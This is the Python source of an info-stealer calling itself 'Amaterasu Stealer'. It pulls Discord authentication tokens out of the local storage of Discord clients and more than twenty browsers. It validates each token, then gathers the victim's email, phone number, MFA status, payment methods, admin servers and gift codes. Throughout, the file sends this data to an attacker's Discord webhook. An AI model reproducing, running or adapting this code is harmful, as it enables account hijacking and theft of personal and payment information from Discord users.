import base64
import json
import os
import re
import requests

from Crypto.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData  # type:ignore


class Discord:
    def __init__(self, webhook: str) -> None:
        SendTokens(webhook).send()


class Stokens:
    def __init__(self) -> None:
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexpenc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens: list[str] = []
        self.uids: list[str] = []

        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': f'{self.roaming}\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': f'{self.roaming}\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': f'{self.roaming}\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': f'{self.roaming}\\discordptb\\Local Storage\\leveldb\\',
            'Opera': f'{self.roaming}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': f'{self.roaming}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': f'{self.appdata}\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': f'{self.appdata}\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': f'{self.appdata}\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': f'{self.appdata}\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': f'{self.appdata}\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': f'{self.appdata}\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': f'{self.appdata}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': f'{self.appdata}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': f'{self.appdata}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': f'{self.appdata}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': f'{self.appdata}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': f'{self.appdata}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': f'{self.appdata}\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': f'{self.appdata}\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': f'{self.appdata}\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': f'{self.appdata}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': f'{self.appdata}\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': f'{self.appdata}\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': f'{self.appdata}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': f'{self.appdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': f'{self.appdata}\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            dc = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(f'{self.roaming}\\{dc}\\Local State'):
                    continue
                for filename in os.listdir(path):
                    if not filename.endswith(tuple(["log", "ldb"])):
                        continue
            else:
                for filename in os.listdir(path):
                    if not filename.endswith(tuple(["log", "ldb"])):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{filename}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validateToken(token):
                                uid = requests.get(self.baseurl, headers={
                                                   'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

        if os.path.exists(f"{self.roaming}\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(f"{self.roaming}\\Mozilla\\Firefox\\Profiles"):
                for ffile in files:
                    if not ffile.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{ffile}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validateToken(token):
                                uid = requests.get(self.baseurl, headers={
                                                   'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def validateToken(self, token: str) -> bool:
        r = requests.get(self.baseurl, headers={
                         'Authorization': token}).status_code
        if r == 200:
            return True
        return False

    def decryptval(self, buff: bytes, masterkey: bytes | str) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(masterkey, AES.MODE_GCM, iv)  # type: ignore
        return cipher.decrypt(payload)[:-16].decode()

    def getMasterkey(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        localstate = json.loads(c)

        masterkey = base64.b64decode(
            localstate["os_crypt"]["encrypted_key"])[5:]
        masterkey = CryptUnprotectData(
            masterkey, None, None, None, 0)[1]
        return masterkey


class SendTokens:
    def __init__(self, webhook: str) -> None:
        self.tokens = Stokens().tokens
        self.webhook = SyncWebhook.from_url(webhook)

    def calcflags(self, flags: int) -> list[list[str | int]]:
        flagsDict = {
            "DISCORD_EMPLOYEE": {
                "emoji": "<:staff:968704541946167357>",
                "shift": 0,
                "ind": 1
            },
            "DISCORD_PARTNER": {
                "emoji": "<:partner:968704542021652560>",
                "shift": 1,
                "ind": 2
            },
            "HYPESQUAD_EVENTS": {
                "emoji": "<:hypersquad_events:968704541774192693>",
                "shift": 2,
                "ind": 4
            },
            "BUG_HUNTER_LEVEL_1": {
                "emoji": "<:bug_hunter_1:968704541677723648>",
                "shift": 3,
                "ind": 4
            },
            "HOUSE_BRAVERY": {
                "emoji": "<:hypersquad_1:968704541501571133>",
                "shift": 6,
                "ind": 64
            },
            "HOUSE_BRILLIANCE": {
                "emoji": "<:hypersquad_2:968704541883261018>",
                "shift": 7,
                "ind": 128
            },
            "HOUSE_BALANCE": {
                "emoji": "<:hypersquad_3:968704541874860082>",
                "shift": 8,
                "ind": 256
            },
            "EARLY_SUPPORTER": {
                "emoji": "<:early_supporter:968704542126510090>",
                "shift": 9,
                "ind": 512
            },
            "BUG_HUNTER_LEVEL_2": {
                "emoji": "<:bug_hunter_2:968704541774217246>",
                "shift": 14,
                "ind": 16384
            },
            "VERIFIED_BOT_DEVELOPER": {
                "emoji": "<:verified_dev:968704541702905886>",
                "shift": 17,
                "ind": 131072
            },
            "CERTIFIED_MODERATOR": {
                "emoji": "<:certified_moderator:988996447938674699>",
                "shift": 18,
                "ind": 262144
            },
            "SPAMMER": {
                "emoji": "⌨",
                "shift": 20,
                "ind": 1048704
            },
            "ACTIVE_DEVELOPER": {
                "emoji": "<:2608activedeveloper:1044014298831257600>",
                "shift": 22,
                "ind": 4194304
            }
        }

        return [[flagsDict[flag]['emoji'], flagsDict[flag]['ind']] for flag in flagsDict if int(flags) & (
            1 << flagsDict[flag]["shift"])]  # type: ignore

    def send(self) -> None:
        if not self.tokens:
            return

        for token in self.tokens:
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get(
                'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get(
                'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            giftcodes = requests.get(
                'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

            username = user['username'] + '#' + user['discriminator']
            userid = user['id']
            email = user['email']
            phone = user['phone'] if user['phone'] else '❌ No'
            mfa = ('❌ No', '✅ Yes')[user['mfa_enabled']]
            avatar = f"https://cdn.discordapp.com/avatars/{userid}/{user['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{userid}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{userid}/{user['avatar']}.png"
            badges = ' '.join([flag[0]  # type: ignore
                               for flag in self.calcflags(user['public_flags'])])
            nitro = {
                0: '❌ No',
                1: '<:7995squarenitroclassic:1021459995734331553>',
                2: '<:2420nitrobadge:1044009489428381746>',
                3: '<:8675squarenitroboost:1021460000402579596'
            }.get(user['premium_type'], "❌")

            payment_methods = "`❌ No`"
            if billing:
                payment_methods = [[
                    "💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else "`❓`"
                    for method in billing
                ]]

            if guilds:
                HQguilds = []
                for guild in guilds:
                    admin = True if guild['permissions'] == '4398046511103' else False
                    if admin and guild['approximate_member_count'] >= 100:
                        owner = "✅" if guild['owner'] else "❌"
                        HQguilds.append(  # type: ignore
                            f"**{guild['name']} ({guild['id']})** \nOwner: `{owner}` `・` Members: `👤 {guild['approximate_member_count']}`")
                if len(HQguilds) > 0:
                    HQguilds = '\n'.join(HQguilds)
                else:
                    HQguilds = "❌"
            else:
                HQguilds = "❌"

            if giftcodes:
                codes = []
                for code in giftcodes:
                    # DEL TITLE SOLO OBTENEMOS 47 CARACTERES Y NO 50
                    title = code['promotion']['outbound_title'][:40] + "..."
                    codes.append(  # type: ignore
                        f"{title}\n**Code:** `{code['code']}`")
                if len(codes) > 0:
                    codes = '\n\n'.join(codes)
                else:
                    codes = "❌"
            else:
                codes = "❌"

            embed_color = int(user['banner_color'].replace("#", ""),
                              16) if user['banner_color'] else 0x2F3136

            embed = Embed(
                title="`🧟`  `|`  ¡New grabbed!",
                colour=embed_color
            ).set_thumbnail(url=avatar)
            embed.description = f"**`👤` ・ User:**\n[{username}](https://discordlookup.com/user/{userid}) ({userid})"

            embed.add_field(name="`📧` ・ Email:",
                            value=f"`{email}`", inline=True)
            embed.add_field(name="`📱` ・ Phone:",
                            value=f"`{phone}`", inline=True)
            embed.add_field(name="`🗝️` ・ Token:",
                            value=f"||`{token}`||", inline=False)
            embed.add_field(name="`🔐` ・ MFA:", value=f"`{mfa}`", inline=True)
            embed.add_field(
                name="`🏅` ・ Badges:", value=f"{badges} {nitro if nitro != '' else nitro}", inline=True)
            embed.add_field(name="`💳` ・ Billing:",
                            value=f"{payment_methods}", inline=False)
            embed.add_field(name="`👑` ・ HQ Guilds:",
                            value=HQguilds, inline=False)
            embed.add_field(name="`🎁` ・ Gift Codes:",
                            value=codes, inline=False)

            embed.set_footer(text="www.github.com/x07ex/amaterasu",
                             icon_url="https://avatars.githubusercontent.com/x07ex")

            self.webhook.send(embed=embed, username="Amaterasu Stealer")
